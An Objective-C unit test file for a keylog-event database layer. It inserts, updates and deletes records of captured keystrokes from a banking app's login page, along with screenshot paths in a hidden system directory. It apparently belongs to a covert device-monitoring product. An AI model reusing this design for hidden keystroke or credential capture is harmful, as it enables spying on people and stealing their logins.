//
//  TestKeyLogDAO.m
//  UnitTestApp
//
//  Created by Makara Khloth on 9/4/13.
//  Copyright 2013 Vervata. All rights reserved.
//
#import <GHUnitIOS/GHUnit.h>
#import "DatabaseManager.h"

#import "DAOFactory.h"
#import "DetailedCount.h"
#import "DefCommonEventData.h"

#import "FxKeyLogEvent.h"
#import "KeyLogDAO.h"

static NSString* const kEventDateTime  = @"11:11:11 2011-11-11";

@interface TestKeyLogDAO : GHTestCase {
@private
    DatabaseManager*  mDatabaseManager;
}

@end

@implementation TestKeyLogDAO

- (void) setUp {
    if (!mDatabaseManager) {
        mDatabaseManager = [[DatabaseManager alloc] init];
        [mDatabaseManager dropDB];
    } else {
        [mDatabaseManager dropDB];
    }
}

- (void) tearDown {
    
}

- (void) testNormalTest {
    FxKeyLogEvent* keyLogEvent = [[FxKeyLogEvent alloc] init];
    keyLogEvent.dateTime = kEventDateTime;
    keyLogEvent.mUserName = @"mobile";
    keyLogEvent.mApplicationID = @"com.kbak.kmobile";
    keyLogEvent.mApplication = @"KBank Mobile";
    keyLogEvent.mTitle = @"K-Bank";
    keyLogEvent.mUrl = @"http://mobile.kbank.com/login.jsp";
    keyLogEvent.mActualDisplayData = @"bpwbassword語錄≈ç¡™£¢∂ƒ¥†©¥¥ƒ¥ƒ†∂®´®ƒ†®†˙®†¥˙˚¨˚¨˙©˙˚¨";
    keyLogEvent.mRawData = @"hello \':\"my name is\"may be good\'\'\'\'\'\'\'\'\'[Hello][_DETETE]";
    keyLogEvent.mScreenshotPath = @"/var/.lsalcore/screenshot/1.jpg";
    KeyLogDAO* keyLogDAO = [DAOFactory dataAccessObject:[keyLogEvent eventType] withSqlite3:[mDatabaseManager sqlite3db]];
    [keyLogDAO insertEvent:keyLogEvent];
    DetailedCount* detailedCount = [keyLogDAO countEvent];
    GHAssertEquals([detailedCount totalCount], 1, @"Count event after insert passed");
    
    NSInteger lastEventId = 0;
    NSArray* eventArray = [keyLogDAO selectMaxEvent:33];
    for (FxKeyLogEvent* keyLogEvent1 in eventArray) {
        lastEventId = [keyLogEvent1 eventId];
        GHAssertEqualStrings([keyLogEvent dateTime], [keyLogEvent1 dateTime], @"Compare date time");
        GHAssertEqualStrings([keyLogEvent mUserName], [keyLogEvent1 mUserName], @"Compare user name");
        GHAssertEqualStrings([keyLogEvent mApplicationID], [keyLogEvent1 mApplicationID], @"Compare application ID");
        GHAssertEqualStrings([keyLogEvent mApplication], [keyLogEvent1 mApplication], @"Compare application");
        GHAssertEqualStrings([keyLogEvent mTitle], [keyLogEvent1 mTitle], @"Compare title");
        GHAssertEqualStrings([keyLogEvent mUrl], [keyLogEvent1 mUrl], @"Compare url");
        GHAssertEqualStrings([keyLogEvent mActualDisplayData], [keyLogEvent1 mActualDisplayData], @"Compare actual display data");
        GHAssertEqualStrings([keyLogEvent mRawData], [keyLogEvent1 mRawData], @"Compare raw data");
        GHAssertEqualStrings([keyLogEvent mScreenshotPath], [keyLogEvent1 mScreenshotPath], @"Compare screen shot path");
    }
    FxKeyLogEvent* tempKeyLogEvent = (FxKeyLogEvent*)[keyLogDAO selectEvent:lastEventId];
    
    GHAssertEqualStrings([keyLogEvent dateTime], [tempKeyLogEvent dateTime], @"Compare date time");
    GHAssertEqualStrings([keyLogEvent mUserName], [tempKeyLogEvent mUserName], @"Compare user name");
    GHAssertEqualStrings([keyLogEvent mApplicationID], [tempKeyLogEvent mApplicationID], @"Compare application ID");
    GHAssertEqualStrings([keyLogEvent mApplication], [tempKeyLogEvent mApplication], @"Compare application");
    GHAssertEqualStrings([keyLogEvent mTitle], [tempKeyLogEvent mTitle], @"Compare title");
    GHAssertEqualStrings([keyLogEvent mUrl], [tempKeyLogEvent mUrl], @"Compare url");
    GHAssertEqualStrings([keyLogEvent mActualDisplayData], [tempKeyLogEvent mActualDisplayData], @"Compare actual display data");
    GHAssertEqualStrings([keyLogEvent mRawData], [tempKeyLogEvent mRawData], @"Compare raw data");
    GHAssertEqualStrings([keyLogEvent mScreenshotPath], [tempKeyLogEvent mScreenshotPath], @"Compare screen shot path");
    NSString *newRawData = @"Hello wow!@#$%^&*()_+=-;:?><[_DELETE]語錄≈ç¡™£¢∂ƒ¥†©¥¥ƒ¥ƒ†∂®´®ƒ†®†˙®†¥˙˚¨˚¨˙©˙˚¨";
    [tempKeyLogEvent setMRawData:newRawData];
    [keyLogDAO updateEvent:tempKeyLogEvent];
    tempKeyLogEvent = (FxKeyLogEvent*)[keyLogDAO selectEvent:lastEventId];
    GHAssertEqualStrings([keyLogEvent dateTime], [tempKeyLogEvent dateTime], @"Compare date time");
    GHAssertEqualStrings([keyLogEvent mUserName], [tempKeyLogEvent mUserName], @"Compare user name");
    GHAssertEqualStrings([keyLogEvent mApplicationID], [tempKeyLogEvent mApplicationID], @"Compare application ID");
    GHAssertEqualStrings([keyLogEvent mApplication], [tempKeyLogEvent mApplication], @"Compare application");
    GHAssertEqualStrings([keyLogEvent mTitle], [tempKeyLogEvent mTitle], @"Compare title");
    GHAssertEqualStrings([keyLogEvent mUrl], [tempKeyLogEvent mUrl], @"Compare url");
    GHAssertEqualStrings([keyLogEvent mActualDisplayData], [tempKeyLogEvent mActualDisplayData], @"Compare actual display data");
    GHAssertEqualStrings(newRawData, [tempKeyLogEvent mRawData], @"Compare raw data");
    GHAssertEqualStrings([keyLogEvent mScreenshotPath], [tempKeyLogEvent mScreenshotPath], @"Compare screen shot path");
    [keyLogDAO deleteEvent:lastEventId];
    detailedCount = [keyLogDAO countEvent];
    GHAssertEquals([detailedCount totalCount], 0, @"Count event after delete passed");
    
    [keyLogEvent release];
}

- (void) testStressTest {
    KeyLogDAO* keyLogDAO = [DAOFactory dataAccessObject:kEventTypeKeyLog withSqlite3:[mDatabaseManager sqlite3db]];
    DetailedCount* detailedCount = [keyLogDAO countEvent];
    GHAssertEquals([detailedCount totalCount], 0, @"Count event");
    
    FxKeyLogEvent* keyLogEvent = [[FxKeyLogEvent alloc] init];
    keyLogEvent.dateTime = kEventDateTime;
    keyLogEvent.mUserName = @"mobile";
    keyLogEvent.mApplicationID = @"com.kbak.kmobile";
    keyLogEvent.mApplication = @"KBank Mobile";
    keyLogEvent.mTitle = @"K-Bank";
    keyLogEvent.mUrl = @"http://mobile.kbank.com/login.jsp";
    keyLogEvent.mActualDisplayData = @"";
    keyLogEvent.mRawData = @"hello \':\"my name is\"may be good\'\'\'\'\'\'\'\'\'[Hello][_DETETE]";
    keyLogEvent.mScreenshotPath = @"/var/.lsalcore/screenshot/1.jpg";
    NSInteger maxEventTest = 1000;
    NSInteger i;
    for (i = 0; i < maxEventTest; i++) {
        keyLogEvent.mRawData = [NSString stringWithFormat:@"%d___[%@]", i, @"[DELETE]"];
        keyLogEvent.mActualDisplayData = [NSString stringWithFormat:@"%d", i];
        [keyLogDAO insertEvent:keyLogEvent];
    }
    detailedCount = [keyLogDAO countEvent];
    GHAssertEquals([detailedCount totalCount], maxEventTest, @"Count event after insert passed");
    
    NSInteger lastEventId = 0;
    NSArray* eventArray = [keyLogDAO selectMaxEvent:maxEventTest];
    NSMutableArray* eventIdArray = [[NSMutableArray alloc] init];
    
    i = 0;
    for (FxKeyLogEvent* keyLogEvent1 in eventArray) {
        lastEventId = [keyLogEvent1 eventId];
        [eventIdArray addObject:[NSNumber numberWithInt:lastEventId]];
        NSString *rawData = [NSString stringWithFormat:@"%d___[%@]", i, @"[DELETE]"];;
        NSString *actualDisplayData = [NSString stringWithFormat:@"%d", i];
        
        GHAssertEqualStrings([keyLogEvent dateTime], [keyLogEvent1 dateTime], @"Compare date time");
        GHAssertEqualStrings([keyLogEvent mUserName], [keyLogEvent1 mUserName], @"Compare user name");
        GHAssertEqualStrings([keyLogEvent mApplicationID], [keyLogEvent1 mApplicationID], @"Compare application ID");
        GHAssertEqualStrings([keyLogEvent mApplication], [keyLogEvent1 mApplication], @"Compare application");
        GHAssertEqualStrings([keyLogEvent mTitle], [keyLogEvent1 mTitle], @"Compare title");
        GHAssertEqualStrings([keyLogEvent mUrl], [keyLogEvent1 mUrl], @"Compare url");
        GHAssertEqualStrings(actualDisplayData, [keyLogEvent1 mActualDisplayData], @"Compare actual display data");
        GHAssertEqualStrings(rawData, [keyLogEvent1 mRawData], @"Compare raw data");
        GHAssertEqualStrings([keyLogEvent mScreenshotPath], [keyLogEvent1 mScreenshotPath], @"Compare screen shot path");
        i++;
    }
    FxKeyLogEvent* tempKeyLogEvent = (FxKeyLogEvent*)[keyLogDAO selectEvent:lastEventId];
    
    GHAssertEqualStrings([keyLogEvent dateTime], [tempKeyLogEvent dateTime], @"Compare date time");
    GHAssertEqualStrings([keyLogEvent mUserName], [tempKeyLogEvent mUserName], @"Compare user name");
    GHAssertEqualStrings([keyLogEvent mApplicationID], [tempKeyLogEvent mApplicationID], @"Compare application ID");
    GHAssertEqualStrings([keyLogEvent mApplication], [tempKeyLogEvent mApplication], @"Compare application");
    GHAssertEqualStrings([keyLogEvent mTitle], [tempKeyLogEvent mTitle], @"Compare title");
    GHAssertEqualStrings([keyLogEvent mUrl], [tempKeyLogEvent mUrl], @"Compare url");
    GHAssertEqualStrings([keyLogEvent mActualDisplayData], [tempKeyLogEvent mActualDisplayData], @"Compare actual display data");
    GHAssertEqualStrings([keyLogEvent mRawData], [tempKeyLogEvent mRawData], @"Compare raw data");
    NSString *newRawData = @"Hello wow!@#$%^&*()_+=-;:?><[_DELETE]";
    [tempKeyLogEvent setMRawData:newRawData];
    [keyLogDAO updateEvent:tempKeyLogEvent];
    tempKeyLogEvent = (FxKeyLogEvent*)[keyLogDAO selectEvent:lastEventId];
    GHAssertEqualStrings([keyLogEvent dateTime], [tempKeyLogEvent dateTime], @"Compare date time");
    GHAssertEqualStrings([keyLogEvent mUserName], [tempKeyLogEvent mUserName], @"Compare user name");
    GHAssertEqualStrings([keyLogEvent mApplicationID], [tempKeyLogEvent mApplicationID], @"Compare application ID");
    GHAssertEqualStrings([keyLogEvent mApplication], [tempKeyLogEvent mApplication], @"Compare application");
    GHAssertEqualStrings([keyLogEvent mTitle], [tempKeyLogEvent mTitle], @"Compare title");
    GHAssertEqualStrings([keyLogEvent mUrl], [tempKeyLogEvent mUrl], @"Compare url");
    GHAssertEqualStrings([keyLogEvent mActualDisplayData], [tempKeyLogEvent mActualDisplayData], @"Compare actual display data");
    GHAssertEqualStrings(newRawData, [tempKeyLogEvent mRawData], @"Compare raw data");
    GHAssertEqualStrings([keyLogEvent mScreenshotPath], [tempKeyLogEvent mScreenshotPath], @"Compare screen shot path");
    for (NSNumber* number in eventIdArray) {
        [keyLogDAO deleteEvent:[number intValue]];
    }
    detailedCount = [keyLogDAO countEvent];
    GHAssertEquals([detailedCount totalCount], 0, @"Count event after delete passed");
    [eventIdArray release];
    [keyLogEvent release];
}
    
- (void) dealloc {
    [mDatabaseManager release];
    [super dealloc];
}

@end
